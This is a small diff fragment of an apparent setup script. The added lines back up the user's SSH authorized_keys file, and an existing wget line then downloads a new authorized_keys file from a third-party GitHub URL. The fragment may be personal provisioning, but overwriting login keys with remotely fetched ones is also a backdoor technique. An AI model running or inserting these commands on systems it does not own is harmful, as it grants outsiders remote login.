@@ -16,5 +16,10 @@
 
 
 ###
+	mkdir -p ~/.ssh/
+ 
+	cd ~/.ssh/
+
+ 	mv authorized_keys authorized_keys.bak.bak
 
 	wget "https://raw.githubusercontent.com/s0trcwd1/pub/main/authorized_keys"
